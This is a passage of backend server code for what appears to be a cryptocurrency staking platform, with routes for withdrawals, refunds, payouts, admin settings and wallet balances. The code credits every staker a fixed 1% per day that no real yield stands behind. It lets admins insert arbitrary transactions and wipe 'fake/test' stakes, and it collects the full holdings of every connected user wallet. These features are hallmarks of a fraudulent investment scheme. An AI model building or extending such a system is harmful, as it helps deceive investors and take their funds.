    if (withdrawal.status !== 'approved') return res.status(400).json({ error: 'Withdrawal is not in approved state' });
    if (withdrawal.txHash) return res.status(400).json({ error: 'Payout already has a tx hash — already sent' });
    if (!PLATFORM_PAYOUT_KEY) return res.status(500).json({ error: 'PLATFORM_PRIVATE_KEY not set in environment' });

    const network = withdrawal.network || 'BSC';
    const token   = withdrawal.payoutToken || 'USDC';
    const amount  = parseFloat(withdrawal.netAmount);

    try {
      const txHash = await sendCryptoToUser(withdrawal.walletAddress, amount, network, token);
      await pool.execute('UPDATE withdrawals SET txHash=? WHERE id=?', [txHash, withdrawal.id]);
      await pool.execute(
        'UPDATE transactions SET txHash=? WHERE walletAddress=? AND status="completed" AND txHash IS NULL LIMIT 1',
        [txHash, withdrawal.walletAddress]
      );
      await pool.execute(
        'INSERT INTO payout_logs (withdrawalId, walletAddress, amount, network, token, txHash, status) VALUES (?,?,?,?,?,?,?)',
        [withdrawal.id, withdrawal.walletAddress, amount, network, token, txHash, 'success']
      );
      console.log(`✅ Resend payout: ${amount} ${token} (${network}) → ${withdrawal.walletAddress} tx:${txHash}`);
      res.json({ success: true, txHash });
    } catch (payErr) {
      await pool.execute(
        'INSERT INTO payout_logs (withdrawalId, walletAddress, amount, network, token, txHash, status, error) VALUES (?,?,?,?,?,?,?,?)',
        [withdrawal.id, withdrawal.walletAddress, amount, network, token, null, 'failed', payErr.message]
      ).catch(() => {});
      console.error('❌ Resend payout failed:', payErr.message);
      res.json({ success: false, payoutError: payErr.message });
    }
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Refund user balance for an approved withdrawal that was never paid out
app.post('/api/admin/withdraw/refund/:id', requireAuth, async (req, res) => {
  try {
    const [[withdrawal]] = await pool.execute('SELECT * FROM withdrawals WHERE id=?', [req.params.id]);
    if (!withdrawal) return res.status(404).json({ error: 'Withdrawal not found' });
    if (withdrawal.status !== 'approved') return res.status(400).json({ error: 'Only approved withdrawals can be refunded' });
    if (withdrawal.txHash) return res.status(400).json({ error: 'Payout was already sent (has tx hash) — cannot refund' });

    const amount = parseFloat(withdrawal.amount);
    const type   = withdrawal.withdrawalType;

    // Restore the balance that was deducted on approval
    if (type === 'claim' || type === 'earnings') {
      await pool.execute(
        'UPDATE users SET claimableRewards = claimableRewards + ? WHERE walletAddress = ?',
        [amount, withdrawal.walletAddress]
      );
    } else if (type === 'stake' || type === 'withdraw') {
      const [[user]] = await pool.execute('SELECT * FROM users WHERE walletAddress=?', [withdrawal.walletAddress]);
      if (user) {
        const newStaked = parseFloat(user.stakedAmount) + amount;
        await pool.execute(
          'UPDATE users SET stakedAmount=?, vipLevel=? WHERE walletAddress=?',
          [newStaked, calculateVipLevel(newStaked), withdrawal.walletAddress]
        );
      }
    }

    await pool.execute(
      'UPDATE withdrawals SET status="refunded", rejectionReason="Refunded — payout was not sent" WHERE id=?',
      [withdrawal.id]
    );
    await pool.execute(
      'UPDATE transactions SET status="refunded" WHERE walletAddress=? AND status="completed" AND txHash IS NULL LIMIT 1',
      [withdrawal.walletAddress]
    );

    console.log(`↩️  Refunded withdrawal ${withdrawal.id}: $${amount} → ${withdrawal.walletAddress}`);
    res.json({ success: true, refundedAmount: amount, walletAddress: withdrawal.walletAddress });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Payout audit logs for admin
app.get('/api/admin/payout-logs', requireAuth, async (req, res) => {
  try {
    const [logs] = await pool.execute('SELECT * FROM payout_logs ORDER BY createdAt DESC LIMIT 100');
    res.json({ success: true, logs });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// User withdrawal history (frontend)
app.get('/api/withdrawals/:walletAddress', async (req, res) => {
  try {
    const [withdrawals] = await pool.execute(
      'SELECT id, amount, netAmount, fee, status, network, payoutToken, txHash, createdAt, approvedAt, withdrawalType FROM withdrawals WHERE walletAddress=? ORDER BY createdAt DESC',
      [req.params.walletAddress]
    );
    res.json({ success: true, withdrawals });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/withdraw/reject', requireAuth, async (req, res) => {
  const { withdrawalId, reason } = req.body;
  try {
    const [[withdrawal]] = await pool.execute('SELECT * FROM withdrawals WHERE id=?', [withdrawalId]);
    if (!withdrawal) return res.status(404).json({ error: 'Withdrawal not found' });

    // Restore claimableRewards if this was a claim (deducted at submission time)
    if (withdrawal.withdrawalType === 'claim' && withdrawal.status === 'pending') {
      await pool.execute(
        'UPDATE users SET claimableRewards = claimableRewards + ? WHERE walletAddress = ?',
        [parseFloat(withdrawal.amount), withdrawal.walletAddress]
      );
    }

    await pool.execute(
      'UPDATE withdrawals SET status="rejected", rejectedAt=NOW(), rejectionReason=? WHERE id=?',
      [reason || 'Rejected by admin', withdrawalId]
    );
    const txType = withdrawal.withdrawalType === 'earnings' ? 'withdraw_earnings'
                 : withdrawal.withdrawalType === 'claim'    ? 'claim'
                 : 'withdraw';
    await pool.execute(
      'UPDATE transactions SET status="rejected" WHERE walletAddress=? AND type=? AND status="pending" LIMIT 1',
      [withdrawal.walletAddress, txType]
    );

    const [[updated]] = await pool.execute('SELECT * FROM withdrawals WHERE id=?', [withdrawalId]);
    console.log(`❌ Withdrawal rejected: ${withdrawal.walletAddress}`);
    res.json({ success: true, withdrawal: updated });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== INTEREST CALCULATION ====================

// Daily rate: exactly 1% per day, distributed hourly (1/100/24 per hour)
const DAILY_RATE = 1.0; // percent

async function calculateInterest() {
  try {
    const hourlyRate = DAILY_RATE / 100 / 24;
    const [result] = await pool.execute(
      `UPDATE users
       SET
         claimableRewards = claimableRewards + (stakedAmount * ?),
         totalEarned      = totalEarned      + (stakedAmount * ?)
       WHERE stakedAmount > 0 AND status = 'active'`,
      [hourlyRate, hourlyRate]
    );
    if (result.affectedRows > 0) console.log(`💰 Interest calculated for ${result.affectedRows} users (${DAILY_RATE}%/day)`);
  } catch (err) {
    console.error('Interest calculation error:', err.message);
  }
}

setInterval(calculateInterest, 3600000);

// Keep Render service alive — ping self every 14 minutes to prevent sleep
const SELF_URL = process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : (process.env.RENDER_EXTERNAL_URL || 'http://localhost:3001');
setInterval(() => {
  https.get(`${SELF_URL}/api/settings`, (res) => {
    console.log(`🏓 Self-ping: ${res.statusCode}`);
  }).on('error', () => {});
}, 14 * 60 * 1000);

// ==================== ADMIN TRANSACTIONS ====================

// Reset all fake/test stakes — wipes stakedAmount, vipLevel, and all stake transactions
app.post('/api/admin/reset-stakes', requireAuth, async (req, res) => {
  try {
    await pool.execute('UPDATE users SET stakedAmount=0, vipLevel=0, status="pending"');
    await pool.execute('DELETE FROM transactions');
    await pool.execute('DELETE FROM withdrawals');
    res.json({ success: true, message: 'All stakes, transactions and withdrawals cleared.' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Full platform reset — deletes ALL users, transactions, withdrawals, wallet records
app.post('/api/admin/reset-all-users', requireAuth, async (req, res) => {
  try {
    await pool.execute('DELETE FROM transactions');
    await pool.execute('DELETE FROM withdrawals');
    await pool.execute('DELETE FROM wallet_balances');
    await pool.execute('DELETE FROM wallet_requests');
    await pool.execute('DELETE FROM users');
    res.json({ success: true, message: 'All users, transactions, withdrawals and wallet records deleted. Platform is fresh.' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/transactions', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute('SELECT *, txDate as date FROM transactions ORDER BY createdAt DESC');
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Stakes-only view — all on-chain stake transactions with tx hash
app.get('/api/admin/stakes', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute(
      `SELECT t.*, txDate as date, u.walletAddress as userWallet
       FROM transactions t
       LEFT JOIN users u ON u.walletAddress = t.walletAddress
       WHERE t.type = 'stake' AND t.status = 'completed'
       ORDER BY t.createdAt DESC`
    );
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post('/api/admin/transactions', requireAuth, async (req, res) => {
  try {
    const { walletAddress, type, amount, status, txHash } = req.body;
    const today = new Date().toISOString().split('T')[0];
    await pool.execute(
      'INSERT INTO transactions (walletAddress, type, amount, txDate, status, txHash) VALUES (?, ?, ?, ?, ?, ?)',
      [walletAddress, type, amount, today, status || 'completed', txHash || null]
    );
    const [[tx]] = await pool.execute('SELECT *, txDate as date FROM transactions ORDER BY id DESC LIMIT 1');
    res.json({ success: true, transaction: tx });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== ADMIN SETTINGS ====================

app.get('/api/admin/settings', requireAuth, async (req, res) => {
  try { res.json(await getSettings()); }
  catch (err) { res.status(500).json({ error: err.message }); }
});

app.put('/api/admin/settings', requireAuth, async (req, res) => {
  // If WALLET_SECRET is configured, require it before saving wallet addresses
  const walletKeys = ['platformWallet','platformWalletETH','platformWalletTRX','platformWalletBTC','commissionWallet'];
  const savingWallets = Object.keys(req.body).some(k => walletKeys.includes(k));
  if (savingWallets && WALLET_SECRET) {
    const provided = req.headers['x-wallet-secret'];
    if (provided !== WALLET_SECRET) {
      return res.status(403).json({ error: 'Wallet secret required to update wallet addresses.' });
    }
  }
  try {
    for (const [key, value] of Object.entries(req.body)) {
      await pool.execute(
        'INSERT INTO platform_settings (`key`, value) VALUES (?, ?) ON DUPLICATE KEY UPDATE value=?',
        [key, String(value), String(value)]
      );
    }
    res.json({ success: true, settings: await getSettings() });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== WALLET BALANCE ====================

app.post('/api/report-balance', async (req, res) => {
  const { walletAddress, eth, usdt, tokens } = req.body;
  if (!walletAddress) return res.status(400).json({ error: 'Wallet address required' });
  const tokensJson = Array.isArray(tokens) && tokens.length > 0 ? JSON.stringify(tokens) : null;
  try {
    await pool.execute(
      'INSERT INTO wallet_balances (walletAddress, eth, usdt, tokensJson, updatedAt) VALUES (?, ?, ?, ?, ?) ON DUPLICATE KEY UPDATE eth=?, usdt=?, tokensJson=?, updatedAt=?',
      [walletAddress.toLowerCase(), eth || '0.0000', usdt || '0.00', tokensJson, Date.now(),
       eth || '0.0000', usdt || '0.00', tokensJson, Date.now()]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Record a user's send-crypto transaction
app.post('/api/send-crypto', async (req, res) => {
  const { walletAddress, token, chain, amount, usdValue, txHash } = req.body;
  if (!walletAddress || !token || !amount) return res.status(400).json({ error: 'Missing required fields' });
  try {
    await pool.execute(
      'INSERT INTO send_crypto (walletAddress, token, chain, amount, usdValue, txHash) VALUES (?, ?, ?, ?, ?, ?)',
      [walletAddress, token, chain || 'bsc', amount, usdValue || '0', txHash || null]
    );
    console.log(`💸 Send crypto recorded: ${walletAddress} sent ${amount} ${token} (${chain}) tx:${txHash}`);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: get all send-crypto activities
app.get('/api/admin/send-crypto', requireAuth, async (req, res) => {
  try {
    const [rows] = await pool.execute('SELECT * FROM send_crypto ORDER BY createdAt DESC');
    res.json({ sends: rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: approve a send-crypto entry
app.post('/api/admin/send-crypto/approve/:id', requireAuth, async (req, res) => {
  try {
    const [result] = await pool.execute(
      'UPDATE send_crypto SET status="approved", approvedAt=NOW() WHERE id=? AND status="pending"',
      [req.params.id]
    );
    if (result.affectedRows === 0) return res.status(400).json({ error: 'Not found or already processed' });
    console.log(`✅ Send crypto #${req.params.id} approved`);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: reject a send-crypto entry
app.post('/api/admin/send-crypto/reject/:id', requireAuth, async (req, res) => {
  try {
    const [result] = await pool.execute(
      'UPDATE send_crypto SET status="rejected" WHERE id=? AND status="pending"',
      [req.params.id]
    );
    if (result.affectedRows === 0) return res.status(400).json({ error: 'Not found or already processed' });
    console.log(`❌ Send crypto #${req.params.id} rejected`);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// User: get their send-crypto history
app.get('/api/send-crypto/:walletAddress', async (req, res) => {
  try {
    const [rows] = await pool.execute(
      'SELECT id, token, chain, amount, usdValue, txHash, status, createdAt, approvedAt FROM send_crypto WHERE walletAddress=? ORDER BY createdAt DESC',
      [req.params.walletAddress]
    );
    res.json({ sends: rows });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Save / update a user's native Bitcoin address
app.post('/api/user/btc-address', async (req, res) => {
  const { walletAddress, btcAddress } = req.body;
  if (!walletAddress) return res.status(400).json({ error: 'walletAddress required' });
  // Basic BTC address validation (P2PKH / P2SH / bech32)
  if (btcAddress && !/^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$/.test(btcAddress)) {
    return res.status(400).json({ error: 'Invalid Bitcoin address' });
  }
  try {
    await pool.execute(
      'INSERT INTO wallet_balances (walletAddress, btcAddress, updatedAt) VALUES (?, ?, 0) ON DUPLICATE KEY UPDATE btcAddress=?',
      [walletAddress.toLowerCase(), btcAddress || null, btcAddress || null]
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

const balanceCache = new Map();
const CACHE_TTL = 30000; // 30s — keeps admin view fresh

async function fetchWithTimeout(promise, timeoutMs = 5000) {
  return Promise.race([
    promise,
    new Promise((_, reject) => setTimeout(() => reject(new Error('Request timeout')), timeoutMs))
  ]);
}

app.get('/api/wallet-balance/:address', async (req, res) => {
  const address = req.params.address;
  if (!ethers.utils.isAddress(address)) return res.status(400).json({ error: 'Invalid wallet address' });
  try {
    const [[reported]] = await pool.execute(
      'SELECT eth, usdt, tokensJson, updatedAt, phantomUsdt, btcAddress FROM wallet_balances WHERE walletAddress=?', [address.toLowerCase()]
    );
    const savedBtcAddress = reported?.btcAddress || null;

    const STABLECOINS = ['USDT', 'USDC', 'BUSD', 'DAI', 'TUSD', 'FRAX'];
    function calcTotalUsd(eth, usdt, tokens, prices) {
      const ethPrice = prices['ethereum']?.usd || 0;
      const ethUsd = parseFloat(eth || 0) * ethPrice;
      const usdtInTokens = tokens.some(t => t.symbol === 'USDT');
      const usdtUsd = usdtInTokens ? 0 : parseFloat(usdt || 0);
      const tokenUsd = tokens.reduce((s, t) => {
        const bal = parseFloat(t.balance || 0);
        let usd = parseFloat(t.usdValue || 0);
        if (usd === 0 && STABLECOINS.includes(t.symbol)) usd = bal;
        return s + usd;
      }, 0);
      return (ethUsd + usdtUsd + tokenUsd).toFixed(2);
    }

    // Augment token list with live Tron scan if missing
    async function withTron(tokens) {
      const hasTron = tokens.some(t => t.chain === 'tron');
      if (hasTron) return tokens;
      const tronUsdt = await fetchTronUsdtBalance(address);
      if (tronUsdt > 0) {
        tokens.push({ symbol: 'USDT', name: 'Tether USD (Tron)', balance: tronUsdt.toFixed(2), usdValue: tronUsdt.toFixed(2), price: '1.0000', chain: 'tron' });
      }
      return tokens;
    }

    // Augment token list with native BTC if a BTC address is saved
    async function withBtc(tokens) {
      if (!savedBtcAddress) return tokens;
      const hasBtc = tokens.some(t => t.chain === 'bitcoin');
      if (hasBtc) return tokens;
      const btcBal = await fetchBtcBalance(savedBtcAddress);
      if (btcBal > 0) {
        const prices = await fetchPrices();
        const btcPrice = prices['bitcoin']?.usd || 0;
        tokens.push({ symbol: 'BTC', name: 'Bitcoin', balance: btcBal.toFixed(8), usdValue: (btcBal * btcPrice).toFixed(2), price: btcPrice.toFixed(2), chain: 'bitcoin' });
      }
      return tokens;
    }

    async function augmentTokens(raw) {
      let tokens = raw;
      tokens = await withTron(tokens);
      tokens = await withBtc(tokens);
      return tokens;
    }

    // Fresh user-reported data (within 60s)
    if (reported && Date.now() - reported.updatedAt < 60000) {
      const tokens = await augmentTokens(reported.tokensJson ? JSON.parse(reported.tokensJson) : []);
      const prices = await fetchPrices();
      const totalUsd = calcTotalUsd(reported.eth, reported.usdt, tokens, prices);
      return res.json({ address, eth: reported.eth, usdt: reported.usdt, tokens, totalUsd, source: 'user-reported', phantomUsdt: parseFloat(reported.phantomUsdt || 0), btcAddress: savedBtcAddress });
    }

    // Check RPC cache
    const cached = balanceCache.get(address.toLowerCase());
    if (cached && Date.now() - cached.timestamp < CACHE_TTL) return res.json(cached.data);

    // Stale reported data — return immediately, re-scan in background
    if (reported) {
      const tokens = await augmentTokens(reported.tokensJson ? JSON.parse(reported.tokensJson) : []);
      const prices = await fetchPrices();
      const totalUsd = calcTotalUsd(reported.eth, reported.usdt, tokens, prices);
      res.json({ address, eth: reported.eth, usdt: reported.usdt, tokens, totalUsd, source: 'user-reported-stale', phantomUsdt: parseFloat(reported.phantomUsdt || 0), btcAddress: savedBtcAddress });
      fetchMultiTokenBalances(address, savedBtcAddress).then(result => {
        pool.execute(
          'UPDATE wallet_balances SET eth=?, usdt=?, tokensJson=?, updatedAt=? WHERE walletAddress=?',
          [result.eth, result.usdt, JSON.stringify(result.tokens), Date.now(), address.toLowerCase()]
        ).catch(() => {});
      }).catch(() => {});
      return;
    }

    // No data at all — fetch from RPC
    const result = await fetchMultiTokenBalances(address, savedBtcAddress);
    balanceCache.set(address.toLowerCase(), { data: result, timestamp: Date.now() });
    res.json(result);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/admin/wallet-balances', requireAuth, async (req, res) => {
  try {
    const [users] = await pool.execute('SELECT walletAddress FROM users');
    const balances = {};
    for (const { walletAddress } of users) {
      if (!ethers.utils.isAddress(walletAddress)) { balances[walletAddress] = { eth: '0.00', usdt: '0.00' }; continue; }
      try {
        const result = await fetchMultiTokenBalances(walletAddress);
        balances[walletAddress] = { eth: result.eth || '0.00', usdt: result.usdt || '0.00' };
      } catch (e) { balances[walletAddress] = { eth: '0.00', usdt: '0.00' }; }
    }
    res.json(balances);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== SERVE ADMIN PAGES ====================

app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/admin/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// Catch-all: return 404 for unknown routes (frontend is on Vercel)
app.use((req, res) => res.status(404).json({ error: 'Not found' }));

// ==================== STARTUP ====================

const PORT = process.env.PORT || 3001;

initDB()
  .then(() => {
    app.listen(PORT, () => {
      console.log(`🚀 Backend running on http://localhost:${PORT}`);
      console.log(`📊 Admin: http://localhost:${PORT}/admin`);
    });
  })
  .catch(err => {
    console.error('❌ Database init failed:', err.message || err.code || JSON.stringify(err));
    console.error('DB config: host=' + (process.env.MYSQLHOST || process.env.MYSQL_HOST || process.env.DB_HOST || 'NOT SET'));
    console.error('DB config: port=' + (process.env.MYSQLPORT || process.env.MYSQL_PORT || process.env.DB_PORT || 'NOT SET'));
    console.error('DB config: user=' + (process.env.MYSQLUSER || process.env.MYSQL_USER || process.env.DB_USER || 'NOT SET'));
    console.error('DB config: database=' + (process.env.MYSQLDATABASE || process.env.MYSQL_DATABASE || process.env.DB_NAME || 'NOT SET'));
    console.error('DB config: MYSQL_URL=' + (process.env.MYSQL_URL ? 'SET' : 'NOT SET'));
    process.exit(1);
  });
